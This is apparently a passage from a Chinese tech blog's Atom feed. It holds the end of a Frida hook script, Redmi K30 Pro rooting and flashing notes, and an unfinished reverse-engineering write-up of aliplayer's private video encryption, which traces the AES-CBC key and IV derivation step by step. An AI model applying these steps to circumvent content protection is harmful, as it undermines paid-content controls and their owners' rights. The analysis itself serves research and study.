class="keyword">function</span> (<span class="params">retValue</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;OUT : ------------------------------------------------ \n&#x27;</span>,</span><br><span class="line">                <span class="title function_">hexdump</span>(a1, &#123;<span class="attr">length</span>: a4, <span class="attr">header</span>: <span class="literal">false</span>&#125;))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="title function_">hookSo1</span>();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/yzctzl/FLVDEC"><img src="https://github-readme-stats.vercel.app/api/pin/?username=yzctzl&repo=FLVDEC&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=yzctzl&repo=FLVDEC&show_owner=true" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></a>]]></content>
    
    
    <summary type="html">番茄社区 Java 层逆向与 FLV+HEVC 的解密</summary>
    
    
    
    <category term="Android" scheme="https://yzctzl.github.io/categories/Android/"/>
    
    
    <category term="AV" scheme="https://yzctzl.github.io/tags/AV/"/>
    
    <category term="Android" scheme="https://yzctzl.github.io/tags/Android/"/>
    
    <category term="DES" scheme="https://yzctzl.github.io/tags/DES/"/>
    
    <category term="HEVC" scheme="https://yzctzl.github.io/tags/HEVC/"/>
    
  </entry>
  
  <entry>
    <title>入手 k30pro 小记</title>
    <link href="https://yzctzl.github.io/2021/k30pro/"/>
    <id>https://yzctzl.github.io/2021/k30pro/</id>
    <published>2021-08-31T16:00:00.000Z</published>
    <updated>2021-08-31T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="工程模式"><a href="#工程模式" class="headerlink" title="工程模式"></a>工程模式</h3><p>CIT： <code>*#*#64663#*#*</code><br>WIFI：<code>*#*#4636#*#*</code></p><h3 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h3><p>Magisk<br>lsposed<br>KurobaEx<br>Tachiyomi</p><h3 id="电池"><a href="#电池" class="headerlink" title="电池"></a>电池</h3><p>电池信息查看，主要有容量和循环次数：<code>cat /sys/class/power_supply/bms/uevent</code></p><h2 id="ROM"><a href="#ROM" class="headerlink" title="ROM"></a>ROM</h2><p>刷机前必须要四清，否则会导致无法开机。</p><h3 id="BL"><a href="#BL" class="headerlink" title="BL"></a>BL</h3><p>工具地址： <a href="https://miui.com/unlock/">https://miui.com/unlock/</a> 需要手机开发者和解锁工具中都登录账号，然后等待一周。</p><h3 id="REC"><a href="#REC" class="headerlink" title="REC"></a>REC</h3><p><a href="https://forum.xda-developers.com/t/evolution-x-5-9-1-for-poco-f2-pro-redmi-k30-pro.4174429/page-22#post-84061873">LR.TEAM TWRP</a> 是一个不错的版本。</p><h3 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h3><h4 id="线刷"><a href="#线刷" class="headerlink" title="线刷"></a>线刷</h4><p>线刷是吧所有分区全都刷入，卡刷是仅刷入 system 等重要分区。<br>&#x3D;&#x3D;&#x3D; 原装包 &#x3D;&#x3D;&#x3D; 有 10 和 11<br>的众多版本，但非常臃肿，可以在官网下载，也可以从外网下载（也是官网）：<br>下载地址：<a href="https://xiaomifirmwareupdater.com/">https://xiaomifirmwareupdater.com/</a></p><h4 id="MIUI-eu"><a href="#MIUI-eu" class="headerlink" title="MIUI.eu"></a>MIUI.eu</h4><p>非常纯净，也是官方维护的：<br>论坛地址：<a href="https://xiaomi.eu/community/">https://xiaomi.eu/community/</a></p><h5 id="卸载自带软件"><a href="#卸载自带软件" class="headerlink" title="卸载自带软件"></a>卸载自带软件</h5><p>EU 版本会有几个自带的软件，可以选择卸载掉，也可以留着问题不大。<br>使用卸载系统应用的 APP 会导致无法开机，推荐：<a href="https://github.com/Szaki/XiaomiADBFastbootTools">https://github.com/Szaki/XiaomiADBFastbootTools</a></p><h5 id="Magisk"><a href="#Magisk" class="headerlink" title="Magisk"></a>Magisk</h5><p>使用卡刷，卡刷包下载地址：<br><a href="https://xiaomi.eu/community/threads/magisk-in-mi-note-10.58047/#post-568116\">https://xiaomi.eu/community/threads/magisk-in-mi-note-10.58047/#post-568116\</a><br>以前直接修改 .apk 为 .zip 可以刷入，现在貌似不知可否。<br>修复 SafetyNet：<a href="https://github.com/kdrag0n/safetynet-fix">https://github.com/kdrag0n/safetynet-fix</a><br>安装 ViPER4Android：<a href="https://forum.xda-developers.com/t/app-fix-100-working-viper4android-for-android-11-devices.4213647/">https://forum.xda-developers.com/t/app-fix-100-working-viper4android-for-android-11-devices.4213647/</a>\</p><h4 id="第三方"><a href="#第三方" class="headerlink" title="第三方"></a>第三方</h4><p>尝试了：dotOS&#x2F;PixelExt&#x2F;crDroid，网上对着三个的评价都是精简，但耗电控制的不好。<br>这里卡刷的时候忘记了四清，或许是导致无法开机的原因。<br>论坛地址：<a href="https://forum.xda-developers.com/f/xiaomi-poco-f2-pro-redmi-k30-pro-roms-kernels.10683/">https://forum.xda-developers.com/f/xiaomi-poco-f2-pro-redmi-k30-pro-roms-kernels.10683/</a></p><h2 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h2><h3 id="开机"><a href="#开机" class="headerlink" title="开机"></a>开机</h3><p>开机 logo 的刷入包和 poco x3 pro 是通用的。<br><a href="https://forum.xda-developers.com/t/twrp-fastboot-splash-screen-collection-for-poco-f2-pro-redmi-k30-pro.4172641/">https://forum.xda-developers.com/t/twrp-fastboot-splash-screen-collection-for-poco-f2-pro-redmi-k30-pro.4172641/</a><br><a href="https://forum.xda-developers.com/t/mod-bootanimation-collection-for-poco-f2-pro-k30-pro.4226517/">https://forum.xda-developers.com/t/mod-bootanimation-collection-for-poco-f2-pro-k30-pro.4226517/</a></p><h2 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h2><h3 id="Riru"><a href="#Riru" class="headerlink" title="Riru"></a>Riru</h3><p>在更新完 riru-v26.1.3.r513.8e95115fd4 突然出现无法开机，并且在 Recovery 中无法挂在 &#x2F;system 因为 read-only：<br><a href="https://android.stackexchange.com/questions/186630/android-o-failed-to-mount-system-dev-block-dm-0-is-read-only">https://android.stackexchange.com/questions/186630/android-o-failed-to-mount-system-dev-block-dm-0-is-read-only</a><br>按照链接中的各种方式处理之后依旧无法解决，最终线刷解决。一秒回到解放前TAT<br>问题参考：<a href="https://github.com/ElderDrivers/EdXposed/issues/878">https://github.com/ElderDrivers/EdXposed/issues/878</a></p><h3 id="谷歌开机验证"><a href="#谷歌开机验证" class="headerlink" title="谷歌开机验证"></a>谷歌开机验证</h3><p>无网络连接的情况下可以跳过，所以拔卡解决。</p><h3 id="4pda"><a href="#4pda" class="headerlink" title="4pda"></a>4pda</h3><p>以前总是登录不上，搜一下俄文字母的数字表示：</p><table><thead><tr><th>0-9</th><th>10-19</th><th>10-90</th><th>100-900</th><th>1000-9000</th></tr></thead><tbody><tr><td>0: ноль</td><td>10: десять</td><td>:</td><td>:</td><td>:</td></tr><tr><td>1: один</td><td>11: одинадцать</td><td>10: десять</td><td>100: сто</td><td>1000: тысяча</td></tr><tr><td>2: два</td><td>12: двенадцать</td><td>20: двадцать</td><td>200: двести</td><td>2000: две тысячи</td></tr><tr><td>3: три</td><td>13: тринадцать</td><td>30: тридцать</td><td>300: триста</td><td>3000: три тысячи</td></tr><tr><td>4: четыре</td><td>14: четырнадцать</td><td>40: сорок</td><td>400: четыреста</td><td>4000: четыре тысячи</td></tr><tr><td>5: пять</td><td>15: пятнадцать</td><td>50: пятьдесят</td><td>500: пятьсот</td><td>5000: пять тысяч</td></tr><tr><td>6: шесть</td><td>16: шестнадцать</td><td>60: шестьдесятv</td><td>600: шестьсот</td><td>6000: шесть тысяч</td></tr><tr><td>7: семь</td><td>17: семнадцать</td><td>70: семьдесят</td><td>700: семьсот</td><td>7000: семь тысяч</td></tr><tr><td>8: восемь</td><td>18: восемнадцать</td><td>80: восемьдесят</td><td>800: восемьсот</td><td>8000: восемь тысяч</td></tr><tr><td>9: девять</td><td>19: девятнадцать</td><td>90: девяносто</td><td>900: девятсот</td><td>9000: девять тысяч</td></tr></tbody></table><p>k30pro 位置：<a href="https://4pda.to/forum/index.php?showtopic=975867">https://4pda.to/forum/index.php?showtopic=975867</a></p><h2 id="system-root-read-only-file-system"><a href="#system-root-read-only-file-system" class="headerlink" title="&#x2F;system_root read-only file system"></a>&#x2F;system_root read-only file system</h2><p>由于修改了某些文件触发了保护机制，导致 &#x2F;system_root 挂载不上。<br>这个问题出现两次了，第一次线刷完整救砖包解决了。<br>今晚又出现了！是导入 Gboard 字典之后出现卡死，重启不进系统，直接<br>fastboot，手机有很多文件，实在不想全都扔掉！<br>搜索到 xda 上有大佬出了解决方案，可过程非常曲折，各种找不到 unzip 然后 255。<br>最后刷入新的 recovery 解决，真是天坑 recovery!!!</p><ol><li>下载 <a href="https://forum.xda-developers.com/t/recovery-3-5-1-unofficial-twrp-poco-f2-pro-redmi-k30-pro-lmi.4241707/">https://forum.xda-developers.com/t/recovery-3-5-1-unofficial-twrp-poco-f2-pro-redmi-k30-pro-lmi.4241707/</a></li><li><code>fastboot flash recovery &quot;name_of_recovery.img&quot;</code></li><li><code>fastboot boot &quot;name_of_recovery.img&quot;</code></li><li>重启之后下载 <a href="https://forum.xda-developers.com/t/script-android-10-universal-mount-system-r-w-read-write.4247311/">https://forum.xda-developers.com/t/script-android-10-universal-mount-system-r-w-read-write.4247311/</a></li><li><code>adb push flashable.zip /data/local/tmp/</code></li><li>修改 <code>config.ini</code> 中 <code>size=1024</code> 表示空闲空间，可以大一点，注意：保留原配置文件格式</li><li>TWRP 直接刷入，忽略报错，重启</li><li>重新安装 Magisk</li></ol><h2 id="系统中挂载不了-system-读写"><a href="#系统中挂载不了-system-读写" class="headerlink" title="系统中挂载不了 &#x2F;system 读写"></a>系统中挂载不了 &#x2F;system 读写</h2><p>不打开 Magisk 就不能打开<br>开发者模式，因为总是闪退，最终，失败了，因为执行了 fastboot oem lock 解锁之后 Data 全没了。<br>重装了 Pixel Exp（不到一天就卸载了）</p><p>又折腾了一次，还是相同的问题，挂载不上 <code>/system</code>，但最后可以了，解决过程如下：</p><ol><li>刷入 12.0.8 线刷包</li><li>刷入 twrp rec</li><li>卡刷入 12.0.8 eu</li><li>bl 中刷入 boot_patch</li><li>三清（art&#x2F;cache&#x2F;data）</li><li>安装面具，检测环境然后重启</li><li>面具刷入 adb-root</li><li>重启入 rec，关闭 verify&#x2F;avb<ol><li><code>adb root &amp;&amp; adb disable-verify &amp;&amp; adb reboot recovery</code></li></ol></li><li>如果上面的某一步完成后进不去系统，可以刷 <code>systemrw</code></li><li>重新挂载：<code>/sbin/.magisk/mirror/</code>中的目录才是可以修改的<ol><li><code>mount -o rw,remount /</code></li><li><code>mount -o rw,remount -t ext4 /sbin/.magisk/block/system_root /sbin/.magisk/mirror/system_root</code></li></ol></li></ol>]]></content>
    
    
    <summary type="html">本文记录在食用 Redmi k30 pro/poco f2 pro 时基本设置。</summary>
    
    
    
    <category term="Android" scheme="https://yzctzl.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="https://yzctzl.github.io/tags/Android/"/>
    
    <category term="root" scheme="https://yzctzl.github.io/tags/root/"/>
    
  </entry>
  
  <entry>
    <title>aliplayer 逆向分析</title>
    <link href="https://yzctzl.github.io/2021/aliplayer/"/>
    <id>https://yzctzl.github.io/2021/aliplayer/</id>
    <published>2021-04-15T16:00:00.000Z</published>
    <updated>2021-04-15T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天我要写个大一点的——aliplayer，这货说难也不难，可说简单也不简单，至少是个体力活，下面一点点来。</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>目标网站：<a href="https://www.ttgame.net/course/video/1">https://www.ttgame.net/course/video/1</a><br>目标的帮助文档：<a href="https://www.alibabacloud.com/help/zh/doc-detail/125579.htm">https://www.alibabacloud.com/help/zh/doc-detail/125579.htm</a><br>目标JavaScript：<br><a href="https://g.alicdn.com/de/prismplayer/2.9.7/aliplayer-min.js">https://g.alicdn.com/de/prismplayer/2.9.7/aliplayer-min.js</a><br><a href="https://g.alicdn.com/de/prismplayer/2.9.7/hls/aliplayer-hls-min.js">https://g.alicdn.com/de/prismplayer/2.9.7/hls/aliplayer-hls-min.js</a><br><a href="https://g.alicdn.com/de/prismplayer/2.9.7/hls/aliplayer-vod-min.js">https://g.alicdn.com/de/prismplayer/2.9.7/hls/aliplayer-vod-min.js</a><br><a href="https://g.alicdn.com/de/prismplayer/2.9.7/hls/aliplayer-vod-anti-min.js">https://g.alicdn.com/de/prismplayer/2.9.7/hls/aliplayer-vod-anti-min.js</a><br>目前最新版本的为 2.9.8，但按照经验，为确保兼容各版本差距很小。<br>本文主要针对<code>私有加密</code>，对于<code>DRM</code>加密还没有涉及。<br><strong>读完帮助文档后在开始工作，很多东西都是帮助文档直接写的，可要调试获知便浪费了很多时间。</strong></p><h2 id="Override"><a href="#Override" class="headerlink" title="Override"></a>Override</h2><p>覆盖后有很多优点，比如控制台输出、固定修改，开始的时候也担心新版会有很多差别，其实差别很小。<br>在本地创建同URL的路径，然后导入到Overrides中。<br>需要注意，网站使用的是 2.8.2 版本的 aliplayer，替换为 2.9.7 版本并不影响工作。<br>这里可以创建两个文件夹，一个是 2.8.2 一个是 2.9.7，可两个都保存着 2.9.7 版本的 JavaScript。<br>当然在<code>aliplayer-min.js</code>直接修改版本号<code>h5Version: 2.9.7</code>更简单。</p><h1 id="是谁处理的-key？"><a href="#是谁处理的-key？" class="headerlink" title="是谁处理的 key？"></a>是谁处理的 key？</h1><h2 id="未末大佬的启发"><a href="#未末大佬的启发" class="headerlink" title="未末大佬的启发"></a>未末大佬的启发</h2><p>看到了有 <code>m3u8</code> 请求，最自然的思路就是：肯定是在 <code>m3u8</code> 请求之后获取到了 <code>key</code>。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/skill/stream/aliplayer/2021-08-12_141535.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/skill/stream/aliplayer/2021-08-12_141535.png" class="lazyload" data-srcset="/skill/stream/aliplayer/2021-08-12_141535.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>进入<code>LoadInternal</code> 之后，一步一步的调试，发现没有任何与 <code>key</code> 本身解密相关的内容。<br>反而是直接在请求完<code>m3u8</code>之后，请求<code>.ts</code>，然后就出现了 <code>key</code>。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/skill/stream/aliplayer/2021-08-12_144500.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/skill/stream/aliplayer/2021-08-12_144500.png" class="lazyload" data-srcset="/skill/stream/aliplayer/2021-08-12_144500.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>这让我走了很多弯路，回头看才发现<code>在请求 m3u8 之前就产生了 key</code>。</p><h2 id="分析调用堆栈"><a href="#分析调用堆栈" class="headerlink" title="分析调用堆栈"></a>分析调用堆栈</h2><p>注意上上图中的唯一一个匿名函数，拿出一看，正好就是原文中下断的函数。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/skill/stream/aliplayer/2021-08-12_142224.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/skill/stream/aliplayer/2021-08-12_142224.png" class="lazyload" data-srcset="/skill/stream/aliplayer/2021-08-12_142224.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>其中 <code>i._sce_dlgtqredxx</code> 就是真正的 <code>key</code>。看到函数名<code>initPlay</code>，提醒我可能需要从播放器初始化之前找。<br>于是把目光放在了调用堆栈上，因为后面找不到谁处理的 key，那一定在 <code>m3u8</code> 请求之前。<br>然后在每个调用堆栈的点下断，应该能找到线索，这里随便找个下断：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/skill/stream/aliplayer/2021-08-12_152510.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/skill/stream/aliplayer/2021-08-12_152510.png" class="lazyload" data-srcset="/skill/stream/aliplayer/2021-08-12_152510.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>仔细查看调用堆栈的每一次调用，发现：<br>最开始调用<code>initPlay</code>函数的是<code>loadData</code>这个函数，所以，<code>initPlay</code> 中的变量<code>o</code>，也就是<code>key</code>一定是该函数中的变量。在<code>h.initPlay(l)</code>处下断，代码如下：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/skill/stream/aliplayer/2021-08-12_153434.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/skill/stream/aliplayer/2021-08-12_153434.png" class="lazyload" data-srcset="/skill/stream/aliplayer/2021-08-12_153434.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>上图中选中的函数<code>n = _sce_dlgtqred(u, r.rand, r.plaintext)</code>就是真正的 Key 处理函数了。</p><h1 id="如何计算出的-Key？"><a href="#如何计算出的-Key？" class="headerlink" title="如何计算出的 Key？"></a>如何计算出的 Key？</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="title function_">_sce_dlgtqred</span>(u, r.<span class="property">rand</span>, r.<span class="property">plaintext</span>)</span><br></pre></td></tr></table></figure><p>该函数的请求有三个参数，<code>u</code> 是个未知串。<br><code>r.rand, r.plaintext</code><br>这两个参数有点眼熟，发现是<code>https://vod.cn-shanghai.aliyuncs.com/?AccessKeyId=...</code>的返回。<br>它们到底是怎么请求的以及 <code>u</code> 是如何产生的放到后面再看，先来看 Key 是如何计算出来的。</p><h2 id="jsvmportal-0-3"><a href="#jsvmportal-0-3" class="headerlink" title="jsvmportal_0_3"></a>jsvmportal_0_3</h2><p>按 F11 步入 Key 的计算函数 <code>jsvmportal_0_3</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jsvmportal_0_3 = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> inout = <span class="variable language_">arguments</span>, retval;</span><br><span class="line">    <span class="title function_">jsvm_this_run</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">    &#125;, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> retval</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>jsvm_this_run</code> 函数做了严重的混淆，使用了一个 <code>switch</code> 函数将所有步骤分解，使得查看过程异常艰难。<br>好记性不如烂笔头，将每一步的操作都记录下来，整个过程大概做了三天，下面捡重点说一下。</p><h2 id="初识-jsvm-this-run"><a href="#初识-jsvm-this-run" class="headerlink" title="初识 jsvm_this_run"></a>初识 jsvm_this_run</h2><p>最开始看到这个函数完全不知所措，不知道每一步做什么，经过单步调试许久之后，发现了几个关键地方：</p><ol><li><code>d</code> 这个参数指示接下来的处理流程，会在每次操作完成后重置</li><li><code>s</code> 这个参数包含了很多固定参数和函数（名），像是一个仓库</li><li><code>o</code> 这个参数包含了将要进行处理的或者刚刚处理过的函数（名）、参数等</li><li><code>h</code> 这个参数包含处理结果，是很多数据的最终存放位置</li><li><code>u</code> 这个参数前面几个参数表示该函数调用做的事情，后面几个参数常常是类似于 <code>o</code>，最后一个参数会用来存放函数调用结果。</li></ol><p>尝试总结一下数据和操作的处理过程为：<br>从 <code>s</code> 中取出参数和函数名放入 <code>o</code>&#x2F;<code>u</code> 中，使用 <code>eval()</code> 执行函数得到结果，存入 <code>o</code>&#x2F;<code>u</code> 中再存入 <code>h</code> 中。<br><code>s</code> 也并非单向的，有时候会把 <code>s</code> 中的函数名转为函数后再存入供以后使用。<br>经过仔细分析后，发现断点应该放在如下位置，第一个断点决定 <code>d</code>，第二个断点做真正的操作：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_162002.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_162002.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_162002.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div><br><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_162018.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_162018.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_162018.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>然后开始 F8 调试，如果不知所云，先看 F8 过一遍大概要进行的操作，做一下大概的记录，然后再来一遍做详细分析。</p><h3 id="case-6"><a href="#case-6" class="headerlink" title="case 6"></a>case 6</h3><p>函数将在这里面进行真实的操作，这也是 <code>switch</code> 函数，其中有几个重要的 <code>case</code> 拿出来看看：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">w = jsvm_this_insns[d];</span><br><span class="line"><span class="keyword">switch</span> (T) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">26</span>:  </span><br><span class="line">    V = w &gt;&gt; <span class="number">7</span> &amp; <span class="number">31</span>;</span><br><span class="line">    S = w &gt;&gt; <span class="number">12</span> &amp; <span class="number">31</span>;</span><br><span class="line">    L = w &gt;&gt; <span class="number">17</span> &amp; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        o[V] = o[S][o[L]]    <span class="comment">// 类似于 eval()</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (r) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">37</span>:  </span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> o[V][<span class="string">&quot;jsvmfunc&quot;</span>] == <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        v = [];</span><br><span class="line">        l = <span class="title function_">loaddata</span>(S);</span><br><span class="line">        <span class="keyword">for</span> (c = <span class="number">0</span>; c &lt; L; c++) &#123;</span><br><span class="line">            v.<span class="title function_">push</span>(<span class="title function_">loaddata</span>(S + L - c))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> o[V] == <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">            u.<span class="title function_">push</span>(o[V].<span class="title function_">apply</span>(l, v))   <span class="comment">// 执行函数的调用</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">42</span>:</span><br><span class="line">    V = w &gt;&gt; <span class="number">7</span> &amp; <span class="number">31</span>;</span><br><span class="line">    S = w &gt;&gt; <span class="number">12</span> &amp; <span class="number">31</span>;</span><br><span class="line">    o[V] = <span class="title function_">r</span>(<span class="string">&quot;&quot;</span> + o[S]);  <span class="comment">// 这里的函数 r() === eval()</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>为了方便可以直接条件断点 <code>T==37</code>，下面为了详细了解过程，就是用上面断点，不断按下 F8 F10 连续查看操作。</p><h3 id="d-0"><a href="#d-0" class="headerlink" title="d 0"></a>d 0</h3><p>这步操作用于产生 <code>s</code> ，具体的细节没有过多了解，不过应该和 <code>jsvm_this_initialization()</code> 有关。</p><h3 id="d-450"><a href="#d-450" class="headerlink" title="d 450"></a>d 450</h3><p>这步操作计算了未知串的 MD5，计算结果返回的是自定义的数据结构，类似于 Int32Array+SigBytes，并存放到了 h[9] 中。</p><h3 id="d-520"><a href="#d-520" class="headerlink" title="d 520"></a>d 520</h3><p>把上一步产生的 MD5 转成了 HEX，也就是我们常见的 MD5 格式。</p><h3 id="d-592"><a href="#d-592" class="headerlink" title="d 592"></a>d 592</h3><p>对上一步的 MD5 做了切片操作，取出了 <code>[8:24]</code>，看这个长度，貌似要用来做 key 或者 iv 啊。<br>在 d &#x3D;&#x3D; 620 左右的时候，取出了一个关键名字 <code>CryptoJS</code>。<br>在 d &#x3D;&#x3D; 672 左右把切片转成了 array，不过不是视为 HEX 转的，而是每个字符独立转换的，所以长度是 16B。<br>在 d &#x3D;&#x3D; 750 左右把 <code>r.rand, r.plaintext</code> 做了去除 <code>\r\n</code> 的处理，目前没发现过带 <code>\r\n</code> 的。<br>在 d &#x3D;&#x3D; 780 左右，得到了 <code>AES</code> 的加密解密函数，并进一步在 d &#x3D;&#x3D; 787 左右，取得了解密函数。<br>在该函数的位置下断，以防错过。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_172000.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_172000.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_172000.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div> <p>在 d &#x3D;&#x3D; 810 左右取出了切片并赋给了 iv。<br>在 d &#x3D;&#x3D; 820 左右取出了 MODE_CBC。</p><h3 id="d-896"><a href="#d-896" class="headerlink" title="d 896"></a>d 896</h3><p>在这里做了 <code>AES.decrypt()</code> 操作，如下图：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_173122.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_173122.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_173122.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>值得注意的是，此处 key &#x3D;&#x3D; iv，其中的需要解密的字符串经过比对正是 <code>r.rand</code>。<br>解密后返回了一个 array[8] 有效长度为 19B 。<br>在 d &#x3D;&#x3D; 942 时，把解密出来的 array 转成了 utf8，截取有效长度，结果是一个有点长的数字串。<br>在 d &#x3D;&#x3D; 1022 左右，又取出了 MD5 函数。<br>在 d &#x3D;&#x3D; 1040 左右，把未知串和解密后的数字串拼接在一起了。</p><h3 id="d-1044"><a href="#d-1044" class="headerlink" title="d 1044"></a>d 